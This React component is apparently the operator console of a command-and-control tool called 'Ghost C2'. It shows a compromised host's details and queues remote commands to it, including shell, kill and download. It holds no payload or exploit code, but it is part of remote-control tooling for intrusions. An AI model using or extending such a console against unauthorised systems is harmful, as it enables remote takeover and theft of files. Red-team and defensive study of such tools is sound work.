import { useState, useRef, useEffect } from 'react'
import { useParams } from 'react-router-dom'
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
import api from '../services/api'

function Interact() {
    const { id } = useParams()
    const [command, setCommand] = useState('')
    const [history, setHistory] = useState([])
    const terminalRef = useRef(null)
    const inputRef = useRef(null)
    const queryClient = useQueryClient()

    // Fetch agent info
    const { data: agent } = useQuery({
        queryKey: ['agent', id],
        queryFn: () => api.get(`/api/agents/${id}`).then(res => res.data)
    })

    // Fetch tasks
    const { data: tasks } = useQuery({
        queryKey: ['tasks', id],
        queryFn: () => api.get(`/api/agents/${id}/tasks`).then(res => res.data),
        refetchInterval: 2000
    })

    // Send command mutation
    const sendCommand = useMutation({
        mutationFn: ({ cmd, args }) =>
            api.post(`/api/agents/${id}/task`, { command: cmd, args }),
        onSuccess: () => {
            queryClient.invalidateQueries(['tasks', id])
        }
    })

    // Update history when tasks change
    useEffect(() => {
        if (tasks) {
            const newHistory = tasks.map(task => ({
                command: `${task.command} ${task.args || ''}`.trim(),
                output: task.result?.output || (task.picked ? '(waiting for result...)' : '(pending)'),
                completed: task.completed,
                status: task.result?.status
            }))
            setHistory(newHistory)
        }
    }, [tasks])

    // Scroll to bottom
    useEffect(() => {
        if (terminalRef.current) {
            terminalRef.current.scrollTop = terminalRef.current.scrollHeight
        }
    }, [history])

    const handleSubmit = (e) => {
        e.preventDefault()
        if (!command.trim()) return

        const parts = command.trim().split(' ')
        const cmd = parts[0]
        const args = parts.slice(1).join(' ')

        sendCommand.mutate({ cmd, args })
        setCommand('')
    }

    const prompt = agent ? `${agent.username}@${agent.hostname}` : 'ghost'

    return (
        <div>
            {/* Agent Info Bar */}
            {agent && (
                <div className="card" style={{ marginBottom: '20px', display: 'flex', gap: '40px' }}>
                    <div>
                        <span style={{ color: 'var(--text-muted)' }}>Host: </span>
                        <span>{agent.hostname}</span>
                    </div>
                    <div>
                        <span style={{ color: 'var(--text-muted)' }}>User: </span>
                        <span>{agent.domain}\\{agent.username}</span>
                    </div>
                    <div>
                        <span style={{ color: 'var(--text-muted)' }}>OS: </span>
                        <span>{agent.os} {agent.arch}</span>
                    </div>
                    <div>
                        <span style={{ color: 'var(--text-muted)' }}>Status: </span>
                        <span className={`status-badge ${agent.status}`}>{agent.status}</span>
                    </div>
                </div>
            )}

            {/* Terminal */}
            <div className="terminal">
                <div className="terminal-header">
                    <span className="terminal-dot red"></span>
                    <span className="terminal-dot yellow"></span>
                    <span className="terminal-dot green"></span>
                    <span style={{ marginLeft: '12px', color: 'var(--text-muted)', fontSize: '0.8rem' }}>
                        Ghost Console — {agent?.id?.slice(0, 12)}
                    </span>
                </div>

                <div className="terminal-body" ref={terminalRef}>
                    <div className="terminal-output">
                        {history.length === 0 ? (
                            <div style={{ color: 'var(--text-muted)' }}>
                                Welcome to Ghost C2 Console{'\n'}
                                Type a command and press Enter. The command will be queued and executed{'\n'}
                                when the agent checks in.{'\n\n'}
                                Available commands: shell, pwd, cd, ls, ps, kill, whoami, sysinfo, download, sleep, exit{'\n\n'}
                            </div>
                        ) : (
                            history.map((item, idx) => (
                                <div key={idx} style={{ marginBottom: '16px' }}>
                                    <span className="prompt">{prompt} $ </span>
                                    <span className="command">{item.command}</span>
                                    {'\n'}
                                    <span className="result">{item.output}</span>
                                    {'\n'}
                                </div>
                            ))
                        )}
                    </div>
                </div>

                <form onSubmit={handleSubmit} className="terminal-input">
                    <span>{prompt} $</span>
                    <input
                        ref={inputRef}
                        type="text"
                        value={command}
                        onChange={(e) => setCommand(e.target.value)}
                        placeholder="Enter command..."
                        autoFocus
                    />
                </form>
            </div>

            {/* Quick Commands */}
            <div className="card" style={{ marginTop: '20px' }}>
                <div className="card-header">
                    <h3 className="card-title">Quick Commands</h3>
                </div>
                <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
                    {['whoami', 'sysinfo', 'pwd', 'ps', 'ls'].map(cmd => (
                        <button
                            key={cmd}
                            className="btn btn-secondary"
                            onClick={() => {
                                sendCommand.mutate({ cmd, args: '' })
                            }}
                        >
                            {cmd}
                        </button>
                    ))}
                </div>
            </div>
        </div>
    )
}

export default Interact
